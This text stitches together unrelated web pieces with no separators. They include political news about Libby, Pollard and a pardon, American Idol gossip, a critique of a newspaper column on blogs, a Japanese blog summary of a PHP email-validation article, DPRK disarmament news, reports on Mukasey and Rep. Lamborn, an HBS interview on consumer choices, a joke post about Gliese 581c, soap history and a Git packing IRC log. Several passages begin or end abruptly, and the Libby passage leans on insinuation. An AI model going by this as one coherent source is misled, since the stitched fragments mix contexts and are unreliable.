Libby later became the Deputy Undersecretary of Defense for Policy and served as a chief aide to Defense Secretary Dick Cheney .
It was while Libby was working for Wolfowitz at State , the FBI arrested Israeli spy Jonathan Pollard , who had delivered enough highly - classified U.S. documents they could have entirely filled a garage .
It was well known that Pollard had a " control officer " within the Reagan administration .
The control officer was code - named " Mega . "
Current British Lord Chancellor and former British Foreign Secretary Jack Straw said that during Middle East peace talks between Israel and the Palestinians , " It 's a toss - up whether [ Libby ] is working for the Israelis or the Americans on any given day . "
Clinton 's Deputy Attorney General Eric Holder told the House Government Affairs Committee in 2001 that he discovered much more about Rich after Clinton 's pardon and said , " Knowing everything that I know now , I would not have recommended to the president that he grant the pardon . "
It has also been reported that , in addition to pressure from leading neocons in the United States to keep Libby out of jail , Bush was urged by leading Israeli government officials to prevent Libby from going to prison .
Fitzgerald issued the following statement regarding Bush 's commutation of Libby 's prison sentence :
" Idol " Reject Is Trying to Screw the Show
Paris Bennett votes for Sanjaya Malakar -- and she hopes it 'll take down " American Idol . "
Last season 's petite powerhouse phoned into the " Tone E Fly Morning Show " in Minneapolis today , and called " Idol " " a joke , " and said she and a few other contestants are using the Web site VotefortheWorst.com to screw with the results .
" We want to see him [ Sanjaya ] win because it'll kind of prove that ' American Idol ' is kind of losing its taste , " says Bennett , " it kinda is n't going for talent anymore and more for popularity . "
At least she is n't bitter .

Blowback !
That ’s what you ’re in for when a great American newspaper runs a Sunday opinion piece as irretrievably lame as “ Blogs : All the noise that fits ” by Michael Skube ( Aug. 19 ) .
Skube is a former Pulitzer Prize - winning author who teaches journalism at Elon University in North Carolina .
( Bio . )
In 2005 , he wrote a similar column for the News & Record in Greensboro , N.C.
There he made fun of the “ evangelical fervor that attends blogging , ” and suggested that bloggers were people who did n’t have normal lives , or children .
“ I do n’t know many people who have time to read blogs , ” he wrote .
“ None of my neighbors do . ”
There was a darker theme .
“ I find myself doing something in my journalism class that gives me considerable unease . ”
What was it ? " ... discussing that often truculent tribe that calls itself bloggers . ”
That students wanted to talk about blogs as journalism filled him with craft - dread .
Notice that not having time to read them did n’t prevent Skube from writing about blogs , which could be considered odd behavior for a college professor .
( We ’re supposed to read a lot , then write . )
I ca n’t link to his ’05 piece because , according to Diane Lamb , a librarian there , “ Skube does not permit his columns to be available in the online public archives of the News & Record . ”
Ed Cone , a local journalist who also keeps a blog , called him up back then to ask Skube where he got his understanding of blogs , because his column had n’t mentioned any .
Skube said he had “ scanned a bunch of blogs , ” but could think of only one scanee , Andrew Sullivan .
“ Given his statement that blogs do n’t do real journalism , I asked him what he thought about Josh Marshall ’s Talking Points Memo , ” Cone wrote .
“ He remembered Marshall as a magazine writer , but was unfamiliar with his blog , or its new investigative - reporting plan . ”
Greensboro at the time was getting national attention for its local blogging culture .
Skube knew zip .
Story jumps to last Sunday .
Josh Marshall reads his name in Skube ’s column .
Strange , because Marshall ’s blog is n’t representative of the charges , which are depressingly familiar .
“ The blogosphere is a potpourri of opinion and little more , ” Skube wrote .
But there ’s a lot more than bubbling opinion at Marshall ’s bustling site , which includes TPM Muckraker , where two full - time investigative reporters work .
Had the author ever seen it ?
In an email exchange , the author tells Marshall , “ I did n’t put your name into the piece and have n’t spent any time on your site . ”
Huh ?
Turns out an editor stuck Marshall ’s name in there because the column did n’t have enough examples in it .
Skube agreed to the script change , but this meant he had no idea what his character was saying .
Dan Gillmor , a former newspaper man , calls it “ journalistic malpractice . ”
And it is that .
Also pedagogical buffoonery .
In Skube ’s columns , there ’s a teacher who does n’t believe in doing his homework - any homework .
So I did it for him .
I asked friends in the blogosphere to help me put together a list of examples that would confound Skube if he knew of them , but possibly interest his students .
Blog sites doing exactly what he says blog sites do n’t do : “ the patient sifting of fact , the acknowledgment that assertion is not evidence ... the depiction of real life . ”

本屋で立ち読みしてたら 、Linux Journalって雑誌に " Validate an E - Mail Address with PHP , the Right Way " って記事が載っているのを発見したので、簡単に要約を。
まず、以下のメールアドレスは「正しい」アドレスである、と紹介。
これは 、RFC3696からの引用。
RFC3696 は 、Application Techniques for Checking and Transformation of Names
( 名前の検査と変換のアプリケーション技法 ) ってやつで、そのなかに、
" Restrictions on email addresses " って章があるみたい 。
続いて、例とし て
http://www.devshed.com/c/a/PHP/Email-Address-Verification-with-PHP/2/
を挙げ、
function checkEmail ( $email ) { if ( preg_match ( " / ^( [ a - zA - Z0 - 9 ] ) + ( [ a - zA - Z0 - 9\._-] )*@長いんでここで改行入れますね ( [ a - zA - Z0 - 9 _ -] ) + ( [ a - zA - Z0 - 9\._-] + ) +$ / " , $ email ) ) { list ( $ username , $domain ) =split ( '@ ' , $email ) ; if (!checkdnsrr( $domain , 'MX ' ) ) { return false ; } return true ; } return false ; }
この関数の間違ってるところを指摘。
正規表現が足りないのはすぐわかるからいいんだけど、DNSのチェックもおかしい、MXレコードが必ずあるとは限らないから、とも書いてある。(symfonyのは、ちゃんと調べてるみたいだ)
さらに
http://www.ilovejackdaniels.com/php/email-address-validation/
のスクリプトも紹介 。
このスクリプトの著 者Dave氏は、RFC2822をきちんと読んでvalidなメールアドレスの
" local - part " が、1文字から64文字であることを理解している、と紹介。
このスクリプト の" the only major flaw " は、ユーザー名中に、 \@ が含まれるときうまく処理できないことらしい 。
で、このあとが面白くて、 「正しいメールアドレスの条件」10か条が、RFCの参照付きで紹介されている。
メールアドレスは local part と domain が @ で区切られて構成されている 。( RFC2822 ) local partは、アルファベット、数字、以下の記号 !
# $ % & ' * + - / = ? ^ _ ` { | } ~ で、ドット 「 .
」で区切られている場合がある。ただし、最初、最後、他のドットの隣にあってはいけない。(つまり連続しないことということか)
( RFC2822 3.2.4 ) local partは、 クオーテーションマーク 「 " 」 のなかにスペースを含むいろんな文字が入った quoted string を含むことがある ( RFC2822 3.2.5 ) \@ などの " quoted pair " をlocal partに含むものも 「 正しい 」 が " obsolete " ( RFC822、RFC2822 4.4 ) ( RFC2822はRFC822をsupersedeしてobsoleteにした、とある ) local partの最大長 は 64文字 ( RFC2821 4.5.3.1 ) domainは、labelがドットで区切られたものである ( RFC1035 2.3.1 ) domainは、アルファベットで始まり、その後に、0文字以上のアルファベット、数字、ハイフン「
- 」が続き、最後の一字はアルファベットか数字。( RFC1035 2.3.1 ) labelの最大長 は 63 字 ( RFC1035 2.3.1 ) domainの最大長 は 255字 ( RFC2821 4.5.3.1 ) domainは、fully qualified で 、DNSのtype AもしくはMXレコードでresolvableでなければならない ( RFC2821 3.6 )
んで、このあと3ページにわたって、色々解説しながら、PHPによるメールアドレス検証関数を実際に作っている。(それをここに写すのは、面倒なのとちょっと悪いような気がするので省略しますが、ご希望があるようなら考えます)
また、記事の最後に面白いことが書いてあるんだけど、
世間のメールアドレス検証は結構いい加減だ、てことは、 spamボットよけに、 {^c\@**Dog^}@example.com
といったメールアドレスを使えるんじゃないか、という提案。
よく、webページに画像でメールアドレスを載せたりするけど、(アンカータグはらずに)このようなメールアドレスを文字で載せておけば、人間はコピペできて楽だし、ボットは正しく認識しない可能性が高いので安全じゃないか?
みたいな。
… …微妙かな 。

と話題が進んできて( 紹介漏れがあったらごめんなさい ) ちょっと思ったんだけど、 メールアドレスに一致する正規表現に、 「 メールアドレスに一致する正規表現は 「ありません」」って書いてあるけど、よくよむと、「クオートすればなんでも入るから」って話ですよね。
( このクソ長い正規表現て、確 か 、Oreilly の " Perl in a Nutshell " かなにかに載っていたような気がするんだけど、昔それ読んで、へー、メールアドレスの検証って大変なんだなーと思ったんだけど )
でも今回の記事読んで、ある程度現実的な線でちゃんとした検証する方法もあるんだなーと。思いました。(DNSはひかんでもいいような気がするけど)
あと、ちょっと文句みたいになるけど、「メールアドレスはこうやって検証すればいい」ってサンプルを紹介するときは、RFCなどの根拠を出さないとあまり意味がないような気がした。(この記事読んでそう思ったんだけど)

A group of U.S nuclear experts entered the Democratic People 's Republic of Korea ( DPRK ) on Tuesday to discuss the disablement of DPRK 's nuclear facilities .
According to the U.S. military based in South Korea , a total of seven U.S. experts got across the border between South Korea and the DPRK at the trucing village of Panmunjom at 11:00 a.m. local time ( 0200 GMT ) .
They are expected to stay in DPRK for five days , the U.S. side said .
One Chinese and one Russian expert will also arrive at Pyongyang by plane from Beijing on the day and join the U.S. experts , South Korea 's local media reported .
According to local media , the experts from China , Russia and U. S. will stay in DPRK until Saturday to discuss the measures of disablement of nuclear facilities in DPRK .

Critics say a 1984 material witness law was abused by the Justice Department , and by Judge Mukasey and his judicial colleagues , to hold terrorist suspects indefinitely after Sept. 11 without having to accuse them of a crime and afford them the rights of a criminal defendant .
The roundup of men like Mr. Awadallah under the material witness law in September and October 2001 was an early effort by the Bush administration to rewrite or reinterpret laws on the detention , interrogation and surveillance of people suspected of terrorist ties after the Sept. 11 attacks — a campaign that is now the subject of furious debate between the White House and the Democratic leaders of Congress .
Critics say the material witness cases before Judge Mukasey after Sept. 11 offer insight into his performance and temperament at a time of duress .
The cases came before him at a time when New York was still in turmoil , with the courthouse in Lower Manhattan , only blocks from the rubble of the World Trade Center , partly shut down and operating under extraordinarily tight security .
Democrats on the Senate Judiciary Committee have said they will try to review cases like Mr. Awadallah ’s in detail before Mr. Mukasey , who retired last year after 18 years on the court , appears before them .
Senator Charles E. Schumer , the New York Democrat who encouraged Mr. Bush to consider Mr. Mukasey for the Justice Department job , said that he was aware of the concerns over the nominee ’s record on material witnesses cases , and that they would be studied by the committee .
“ There will certainly be those questions for him , ” Mr. Schumer said .
Congressional aides said that while the committee ’s chairman , Senator Patrick J. Leahy , Democrat of Vermont , thought it was too early to discuss specific questions that would be put to Mr. Mukasey , the senator has long been concerned about the possible abuse of the federal material witness statute in the indefinite detention of terrorist suspects .
The records of most material witnesses cases are sealed , so there is no way to determine whether Judge Mukasey ’s tone in the October 2001 hearing for Mr. Awadallah reflects his handling of other witnesses picked up after Sept. 11 .
Colorado Springs – Rep. Doug Lamborn left two voice mails at the home of a couple who questioned his acceptance of campaign contributions from the gambling industry , saying there would be “ consequences ” if the couple did not respond .
Jonathan and Anna Bartha wrote a letter printed in the Aug. 24 Woodmen Edition , a community newspaper .
The couple raised concerns about Lamborn ’s receipt of $ 1,000 from International Game Technology PAC and a $ 500 contribution last summer from Marc Murphy , an executive of Bronco Billy ’s Casino in Cripple Creek .
IGT makes gambling equipment .
Jonathan Bartha , 34 , is employed by Focus on the Family .
His wife , a board member of Falcon School District 49 , worked for two months as a scheduler for candidate Jeff Crank during a bitter , six - way Republican primary race for the 5th Congressional District seat .
In his messages , Lamborn said he wanted to appeal to the couple as “ brothers and sisters in Christ ” and implored them to call him back to discuss their “ blatantly false ” letter .
“ We felt very threatened and intimidated , and quite frankly , scared , ” Anna Bartha said .
“ It was just not anything we would ever anticipate an elected official would pursue or a way that an elected official would conduct himself . ”
When asked whether his messages were threatening , Lamborn said : “ No , that is ridiculous .
My hope , I failed , but I had hoped to meet with them privately and confidentially because lying is a serious matter . ”
When asked what he meant when he said there would be “ consequences , ” Lamborn said : “ When someone tells a lie , it just has bad consequences . ”
Three days after leaving the messages on the Barthas ’ voice mail , Lam born wrote an open letter to Greg Garcia , chair of the El Paso County Republicans , asking him to investigate .
In an open letter to the party on Aug. 8 , Garcia said the local party would not tolerate false or misleading statements in campaigns .
“ That ’s a lot of what I ’m thinking of when I talk about ‘ there are consequences , ’ because Greg Garcia had said earlier that there is going to be a punishment if people tell lies in the course of a campaign , ” Lamborn said .
As a private citizen , Bartha has the right to question an elected official ’s actions .
Federal records show that Lamborn received a $ 1,000 check Jan. 30 , 2007 , from the IGT PAC .
Records also show receipt of $ 500 from Murphy last summer .
Lamborn said he has returned both contributions , but he could not say when that was done .
Nancy Brown , a spokeswoman for Jones Vargas , a law firm in Reno , Nev. , that represents IGT , said the company ’s PAC sent a $ 1,000 contribution to Lamborn in January .
She said Lamborn returned the check , although she could not provide the date of the return .
Federal records do not show that the check was returned .
Murphy could not be reached for comment .

Like having both an angel and a devil whispering advice in our ears , consumers often wrestle with the " want " versus " should " decision .
Yes , I want to purchase that chocolate bar , but I should snack on granola instead .
Yes , I want the gleaming red Ferrari , but given my budget , I should purchase the used Toyota Camry .
How consumers weigh those decisions is crucial information for retailers , and is the subject of recent research by Harvard Business School doctoral candidates Todd Rogers and Katy Milkman , in collaboration with Professor Max Bazerman .
In this e-mail Q&A with Milkman and Rogers , they discuss their working paper " I'll Have the Ice Cream Soon and the Vegetables Later : Decreasing Impatience over Time in Online Grocery Orders , " which looks at our tendency as consumers to choose " want " items in the short run but weigh toward " should " items when the impact will be felt in the future .
They also talk about their related research on DVD rentals — should I rent the good - for - me documentary An Inconvenient Truth or the entertaining Pirates of the Caribbean — and offer implications for managers in areas such as demand forecasting , consumer spending habits , and effective store layout .
Sarah Jane Gilbert :
What is the difference between the " want - self " and the " should - self " ?
How does psychology play a role in the internal conflict between the 2 ?
Todd Rogers and Katy Milkman : People often behave as if they possess multiple selves with different , competing interests .
We call 2 of these metaphorical selves the " want - self " and the " should - self . "
The want - self is myopic and desires instant gratification .
If left to its own devices , the want - self would always act on immediate , visceral desires ( e.g. , spending instead of saving money , eating junk food instead of health food ) .
The should - self , on the other hand , prefers to behave in a way that will maximize long - run benefits .
If left to its own devices , the should - self would always act on behalf of an individual 's long - term best interests ( e.g. , saving money or donating it to a good cause instead of spending frivolously , eating health food instead of junk food ) .
" People focused a higher percentage of their spending on ice cream ( and other ' want ' groceries ) when placing orders for delivery in the near future . ”
The " multiple selves " metaphor resonates with many people because most of us regularly struggle with choices between 2 options , one of which we know we should choose because it would be virtuous to do so and one of which we want to choose to satisfy our visceral desires .
An obvious example of this type of dilemma is the choice of what to eat for lunch : a slice of pizza or a salad ?
What do you think you should eat ?
Now , what do you feel , viscerally , that you want to eat ?
For most people , this is an easy one :
They want to eat the delicious , greasy pizza but know they should eat the healthy salad .
This is a classic example of want - should conflict .
Past decision - making research has shown that when a decision will take effect in the future , people weigh the interests of the want - self less relative to the interests of the should - self .
For instance , you are more likely to agree to put additional money in your savings account if that money will be withdrawn from a future paycheck rather than the paycheck in your pocket ( Benartzi and Thaler , 2003 ) .
Similarly , you are more likely to donate money to a good cause if the donation will come out of a future paycheck ( Breman , 2007 ) .
Q : How do you apply this to online grocery shopping ?
A : We predicted that online grocery shoppers would order healthier groceries when ordering for delivery in the distant future ( i.e. , 5 days from now ) than when ordering for delivery in the more immediate future ( i.e. , tomorrow ) .
This is exactly what we found .
We analyzed a year of individual - level data from a North American online grocer to determine how the delay between when a person 's order was completed and when it was delivered affected the content of the order .
In general , as the delay between order completion and the date a customer selected for delivery increased , customers spent less money per order ( or behaved less impulsively ) , ordered a higher percentage of " should " items ( e.g. , vegetables ) , and ordered a lower percentage of " want " items ( e.g. , ice cream ) .
A simple way of describing our findings is that people focused a higher percentage of their spending on ice cream and other want groceries when placing orders for delivery in the near future than when ordering for delivery in the more distant future .
On the flip side , they focused a lower percentage of their spending on fresh vegetables and other should groceries when ordering for delivery in the near future than when ordering for delivery in the more distant future .
Q : Did you find similarities in other areas where consumers are making choices ?
A : Our research team has completed 2 other projects that examine the dynamics of the want - should conflict .
The first project , conducted by the same team of Katy , Todd , and Max , analyzed the implications of want - should conflict in the context of online DVD rentals .
The second project , conducted by Todd and Max , tackled the prescriptive policy question :
How can we increase the odds that people will select should options , which is in their long - term best interest to do ?
For the first project we obtained access ( with the help of HBS professor Anita Elberse ) to a data set containing information about the film rental and return behaviors of a sample of the customers of an Australian online DVD rental company .
With this data we examined whether the choices people anticipate making in the future ( represented by the order in which they rent movies ) systematically differ from the choices people make in the " heat of the moment " ( represented by the order in which they watch and return the movies they rent ) .
In " Film Rentals and Procrastination : A Study of Intertemporal Reversals in Preferences and Intrapersonal Conflict , " we predicted and found that people are more likely to rent DVDs in one order and return them in the reverse order when should DVDs ( e.g. , documentaries ) are rented before want DVDs ( e.g. , action films ) .
Similarly , we predicted and found that should DVDs are held by online renters longer than want DVDs , meaning people procrastinate considerably more about watching documentaries , for example , than action films .
For the second related project Todd and Max looked at how time - to - implementation from the moment of decision affects preferences for should options .
We looked at scenarios that involved want - should conflict like support for a policy that would benefit one 's employer but would be costly to oneself ; support for a tax on gas to reduce consumption and pollution ; support for a personal savings plan ; and willingness to donate money .
We found that people are much more likely to make binding selections of should options when the options will be implemented in the distant future than when they will be implemented in the near future .
This research offers prescriptive guidance for how we can facilitate the selection of should choices : structure these choices so that they are binding and implemented in the more distant future .
This research is in our working paper " Future Lock - in : Or , I 'll Agree to Do the Right Thing … Next Week . "
Q : What implications do your research findings have for online retailers or other business channels ?
A : Our study has implications for online and catalogue retailers that offer a range of goods for sale and also offer different delivery options .
Such companies might be able to improve their demand forecasting by taking into account the fact that their customers appear likely to order a higher percentage of want goods and a lower percentage of should goods for delivery in the near future relative to the more distant future .
In addition , online and catalogue retailers should anticipate that the further in advance of delivery an order is placed , the less a customer is likely to spend .
Q : Could your findings be applied to in - person grocery shopping ?
A : If we were to extrapolate from our results , ignoring the major differences between shopping for the present and shopping for the future , it seems that to maximize the sale of healthy items or should groceries , brick - and - mortar grocery stores might display healthy foods near the entrance of the store so they will be encountered early on in the shopping experience and as far as possible from the moment when actual consumption will take place .
Brick - and - mortar grocers may have already realized this , as fresh vegetables tend to be displayed in the first area customers encounter when they enter most major grocery stores .
Q : What are you working on next ?
A : With HBS doctoral candidate John Beshears , we are examining how people 's online grocery orders are affected by the receipt of a coupon for $ 10 off their bill .
A rational actor model suggests that people without extreme wealth constraints ( meaning anyone who can afford to shop for groceries online ) should buy the same items they would have bought without a coupon when redeeming a $ 10 off discount .
According to the rational actor model , the $ 10 saved should be considered a small addition to an individual 's lifetime wealth , which will eventually be spent on a broad array of future purchases .
This is not the way we expected people to think about $ 10 discount coupons , however .
We anticipated that the receipt of a $ 10 discount would cause people to " splurge " on some extra goodies they might not otherwise have purchased .
This is exactly what we observed , and this finding contradicts standard economic theory .
On average , people buy an extra $ 2 worth of groceries per order when they receive a $ 10 off coupon .
This finding has important implications for economic models of life - cycle consumption , as well as the models marketers use to estimate the true costs of coupon offers .
Another area of research that Todd is particularly excited about involves using behavioral principles to more effectively mobilize citizens to vote .
Voting is an important domain where people know what they should do ( they should vote ) , but do not always follow through on it .
Todd is working on a handful of other projects looking at how to facilitate people 's decisions to follow through on the should choice to vote .
Katy is also pursuing a study of the earnings forecasts made by sell - side stock analysts .
Along with John , she is examining biases in the way analysts update their earnings forecasts in response to new information .
Scientists discovered a planet 20.5 light years from here that seems to have the right stuff for sustaining life .
http://www.msnbc.msn.com/id/18293978/
The scientists named the planet Gliese 581 C , evidently to showcase the reason scientists ca n’t get laid .
Science fiction writers all over the Earth are muttering , “ Fuck you very much . ”
No one is going to buy a book titled “ Escape From Gliese 581 C . ”
And if we discover advanced life on that planet , what do we call them ?
It wo n’t be something easy like Martians , or Venutians .
No , they will be Gliese 581 Csians – a name that practically demands we discriminate against them .
Seriously , do n’t the discovering scientists have a neighbor or a friend who works in marketing ?
Watch me spend all of thirty seconds to come up with five better names for that bad boy .
And I wo n’t even use New Earth or Earth V2.0 .
Time me .

Done !
See ?
How hard was that ?
We do n’t know if the planet already has life .
I suggest we play God and put some there .
20.5 light years is too long for human travel , but we could place some hearty bacteria and whatnot in a probe and fire it in that direction .
If there is n’t already life on Gliese 581 C , the bacteria and whatnot can evolve into zebras and Creationists over time .
If there already is life on the planet , our bacteria and whatnot will probably infect them and wipe out their civilization .
So we might want to put a Mars license plate on the probe .
Infotainment questions for the day :
1 . Do we have the technology to seed that planet with life ?
2 . How do we know the Gliese 581 Csians did n’t seed life on Earth ?
It seems to me that we now have a falsifiable hypothesis for Intelligent Design on Earth .
My hypothesis is that it came from Gliese 581 C. I call that science .
We should teach it in schools .
Go .

How would he survive the next 25 hours ?
Have you wondered how soap is made ?
The history of soap is actually quite interesting .
Soap is made from combining fats and oils with an alkali .
When mixed with water , soap loosens and attracts dirt , allowing it to be washed away .
The earliest known soap - like material was found in the excavation of ancient Babylon and dates back to 2800 B.C.
Fats were boiled with ash according to inscriptions found on clay tablets .
There are records that show that the Egyptians bathed regularly .
In the 8th century , soap making gained popularity in Italy and Spain and gradually spread throughout Europe .
According to some sources , the word soap is derived from ancient Roman story .
Animals were sacrificed at Mount Sapo .
When the rain washed the animal fat and ashes down unto the banks of the Tiber river , it was found that the clay enabled washing with less effort .
“ Sapo ” , however , is a Latin word which means “ soap ” and was borrowed from a Celtic or Germanic language .
Modern soap making involves either a hot or cold process .
Handmade soap is usually made with the cold process and is still very popular these days .
Most cleaners labeled soap these days are actually detergents .
Detergents do not contain any soap and are chemically synthesized from raw material .
The demand for detergents grew as ingredients for soap became scarce in World War II .
Concerning Git's Packing Heuristics ===================================
Oh , here 's a really stupid question :
Where do I go to learn the details of Git 's packing heuristics ?
Be careful what you ask !
Followers of the Git , please open the Git IRC Log and turn to February 10 , 2006 .
It 's a rare occasion , and we are joined by the King Git Himself , Linus Torvalds ( linus ) .
Nathaniel Smith , ( njs` ) , has the floor and seeks enlightenment .
Others are present , but silent .
Let 's listen in !
< njs` >
Oh , here 's a really stupid question -- where do I go to learn the details of Git 's packing heuristics ?
google avails me not , reading the source did n't help a lot , and wading through the whole mailing list seems less efficient than any of that .
It is a bold start !
A plea for help combined with a simultaneous tri-part attack on some of the tried and true mainstays in the quest for enlightenment .
Brash accusations of google being useless .
Hubris !
Maligning the source .
Heresy !
Disdain for the mailing list archives .
Woe . < pasky > yes , the packing - related delta stuff is somewhat mysterious even for me ;)
Ah!
Modesty after all .
< linus > njs , I do n't think the docs exist .
That 's something where I do n't think anybody else than me even really got involved .
Most of the rest of Git others have been busy with ( especially Junio ) , but packing nobody touched after I did it .
It 's cryptic , yet vague .
Linus in style for sure .
Wise men interpret this as an apology .
A few argue it is merely a statement of fact .
< njs` >
I guess the next step is " read the source again " , but I have to build up a certain level of gumption first :-)
Indeed !
On both points .
< linus >
The packing heuristic is actually really really simple .
Bait ... < linus >
But strange .
And switch .
That ought to do it !
< linus >
Remember : Git really does n't follow files .
So what it does is - generate a list of all objects - sort the list according to magic heuristics - walk the list , using a sliding window , seeing if an object can be diffed against another object in the window - write out the list in recency order
The traditional understatement : < njs` >
I suspect that what I 'm missing is the precise definition of the word " magic "
The traditional insight : < pasky > yes And Babel - like confusion flowed .
< njs` > oh , hmm , and I 'm not sure what this sliding window means either < pasky > iirc , it appeared to me to be just the sha1 of the object when reading the code casually ... ... which simply does n't sound as a very good heuristics , though ;) < njs` > ..... and recency order .
okay , I think it 's clear I did n't even realize how much I was n't realizing :-)
Ah , grasshopper !
And thus the enlightenment begins anew .
< linus >
The " magic " is actually in theory totally arbitrary .
ANY order will give you a working pack , but no , it 's not ordered by SHA - 1 .
Before talking about the ordering for the sliding delta window , let 's talk about the recency order .
That 's more important in one way .
< njs` >
Right , but if all you want is a working way to pack things together , you could just use cat and save yourself some trouble ...
Waaait for it .... < linus >
The recency ordering ( which is basically : put objects _physically_ into the pack in the order that they are " reachable " from the head ) is important .
< njs` > okay < linus >
It 's important because that 's the thing that gives packs good locality .
It keeps the objects close to the head ( whether they are old or new , but they are _reachable_ from the head ) at the head of the pack .
So packs actually have absolutely _wonderful_ IO patterns .
Read that again , because it is important .
< linus >
But recency ordering is totally useless for deciding how to actually generate the deltas , so the delta ordering is something else .
The delta ordering is ( wait for it ) : - first sort by the " basename " of the object , as defined by the name the object was _first_ reached through when generating the object list - within the same basename , sort by size of the object - but always sort different types separately ( commits first ) .
That 's not exactly it , but it 's very close .
< njs` >
The " _first_ reached " thing is not too important , just you need some way to break ties since the same objects may be reachable many ways , yes ?
And as if to clarify : < linus >
The point is that it 's all really just any random heuristic , and the ordering is totally unimportant for correctness , but it helps a lot if the heuristic gives " clumping " for things that are likely to delta well against each other .
It is an important point , so secretly , I did my own research and have included my results below .
To be fair , it has changed some over time .
And through the magic of Revisionistic History , I draw upon this entry from The Git IRC Logs on my father 's birthday , March 1 : < gitster >
The quote from the above linus should be rewritten a bit ( wait for it ) : - first sort by type .
Different objects never delta with each other .
- then sort by filename / dirname .
hash of the basename occupies the top BITS_PER_INT - DIR_BITS bits , and bottom DIR_BITS are for the hash of leading path elements .
- then if we are doing " thin " pack , the objects we are _not_ going to pack but we know about are sorted earlier than other objects .
- and finally sort by size , larger to smaller .
In one swell - foop , clarification and obscurification !
Nonetheless , authoritative .
Cryptic , yet concise .
It even solicits notions of quotes from The Source Code .
Clearly , more study is needed .
< gitster >
That 's the sort order .
What this means is : - we do not delta different object types .
- we prefer to delta the objects with the same full path , but allow files with the same name from different directories .
- we always prefer to delta against objects we are not going to send , if there are some .
- we prefer to delta against larger objects , so that we have lots of removals .
The penultimate rule is for " thin " packs .
It is used when the other side is known to have such objects .
There it is again .
" Thin " packs .
I 'm thinking to myself , " What is a ' thin ' pack ? "
So I ask : < jdl >
What is a " thin " pack ?
< gitster >
Use of -- objects - edge to rev-list as the upstream of pack - objects .
The pack transfer protocol negotiates that .
Woo hoo !
Cleared that _right_ up !
< gitster >
There are two directions - push and fetch .
There !
Did you see it ?
It is not ' " push " and " pull " ' !
How often the confusion has started here .
So casually mentioned , too ! < gitster >
For push , git - send - pack invokes git - receive - pack on the other end .
The receive - pack says " I have up to these commits " .
send - pack looks at them , and computes what are missing from the other end .
So " thin " could be the default there .
In the other direction , fetch , git - fetch - pack and git - clone - pack invokes git - upload - pack on the other end ( via ssh or by talking to the daemon ) .
There are two cases : fetch - pack with -k and clone - pack is one , fetch - pack without -k is the other .
clone - pack and fetch - pack with -k will keep the downloaded packfile without expanded , so we do not use thin pack transfer .
Otherwise , the generated pack will have delta without base object in the same pack .
But fetch - pack without -k will explode the received pack into individual objects , so we automatically ask upload - pack to give us a thin pack if upload - pack supports it .
OK then .
Uh .
Let 's return to the previous conversation still in progress .
< njs` > and " basename " means something like " the tail of end of path of file objects and dir objects , as per basename ( 3 ) , and we just declare all commit and tag objects to have the same basename " or something ?
Luckily , that too is a point that gitster clarified for us !
If I might add , the trick is to make files that _might_ be similar be located close to each other in the hash buckets based on their file names .
It used to be that " foo / Makefile " , " bar/ baz/ quux / Makefile " and " Makefile " all landed in the same bucket due to their common basename , " Makefile " .
However , now they land in " close " buckets .
The algorithm allows not just for the _same_ bucket , but for _close_ buckets to be considered delta candidates .
The rationale is essentially that files , like Makefiles , often have very similar content no matter what directory they live in .

I played around with different delta algorithms , and with making the " delta window " bigger , but having too big of a sliding window makes it very expensive to generate the pack : you need to compare every object with a _ton_ of other objects .
There are a number of other trivial heuristics too , which basically boil down to " do n't bother even trying to delta this pair " if we can tell before - hand that the delta is n't worth it ( due to size differences , where we can take a previous delta result into account to decide that " ok , no point in trying that one , it will be worse " ) .
End result : packing is actually very size efficient .
It 's somewhat CPU - wasteful , but on the other hand , since you 're really only supposed to do it maybe once a month ( and you can do it during the night ) , nobody really seems to care .
Nice Engineering
Touch , there .
Find when it does n't matter , and proclaim it a non-issue .
Good style too !
< njs` >
So , just to repeat to see if I 'm following , we start by getting a list of the objects we want to pack , we sort it by this heuristic ( basically lexicographically on the tuple ( type , basename , size ) ) .
Then we walk through this list , and calculate a delta of each object against the last n ( tunable parameter ) objects , and pick the smallest of these deltas .
Vastly simplified , but the essence is there !
< linus > Correct . < njs` >
And then once we have picked a delta or fulltext to represent each object , we re-sort by recency , and write them out in that order .
< linus > Yup .
Some other small details :
And of course there is the " Other Shoe " Factor too .
< linus > -
We limit the delta depth to another magic value ( right now both the window and delta depth magic values are just " 10 " ) < njs` >
Hrm , my intuition is that you 'd end up with really _bad_ IO patterns , because the things you want are near by , but to actually reconstruct them you may have to jump all over in random ways .
< linus > -
When we write out a delta , and we have n't yet written out the object it is a delta against , we write out the base object first .
And no , when we reconstruct them , we actually get nice IO patterns , because : - larger objects tend to be " more recent " ( Linus ' law : files grow ) - we actively try to generate deltas from a larger object to a smaller one - this means that the top - of - tree very seldom has deltas ( i.e. deltas in _practice_ are " backwards deltas " )
Again , we should reread that whole paragraph .
Not just because Linus has slipped Linus 's Law in there on us , but because it is important .
Let 's make sure we clarify some of the points here : < njs` >
So the point is just that in practice , delta order and recency order match each other quite well .
< linus >
Yes .
There 's another nice side to this ( and yes , it was designed that way ;) : - the reason we generate deltas against the larger object is actually a big space saver too !
< njs` >
Hmm , but your last comment ( if " we have n't yet written out the object it is a delta against , we write out the base object first " ) , seems like it would make these facts mostly irrelevant because even if in practice you would not have to wander around much , in fact you just brute - force say that in the cases where you might have to wander , do n't do that :-) < linus >
Yes and no .
Notice the rule : we only write out the base object first if the delta against it was more recent .
That means that you can actually have deltas that refer to a base object that is _not_ close to the delta object , but that only happens when the delta is needed to generate an _old_ object .
< linus > See ?
Yeah , no .
I missed that on the first two or three readings myself .
< linus >
This keeps the front of the pack dense .
The front of the pack never contains data that is n't relevant to a " recent " object .
The size optimization comes from our use of xdelta ( but is true for many other delta algorithms ) : removing data is cheaper ( in size ) than adding data .
When you remove data , you only need to say " copy bytes n-- m " .
In contrast , in a delta that _adds_ data , you have to say " add these bytes : ' actual data goes here ' " *** njs` has quit : Read error : 104 ( Connection reset by peer ) < linus >
Uhhuh .
I hope I did n't blow njs` mind .
*** njs` has joined channel # git < pasky > :)
The silent observers are amused .
Of course .
And as if njs` was expected to be omniscient : < linus > njs - did you miss anything ?
OK , I 'll spell it out .
That 's Geek Humor .
If njs` was not actually connected for a little bit there , how would he know if missed anything while he was disconnected ?
He 's a benevolent dictator with a sense of humor !
Well noted !
< njs` > Stupid router .
Or gremlins , or whatever .
It 's a cheap shot at Cisco .
Take 'em when you can .
< njs` >
Yes and no .
Notice the rule : we only write out the base object first if the delta against it was more recent .
I 'm getting lost in all these orders , let me re-read :-)
So the write - out order is from most recent to least recent ?
( Conceivably it could be the opposite way too , I 'm not sure if we 've said ) though my connection back at home is logging , so I can just read what you said there :-)
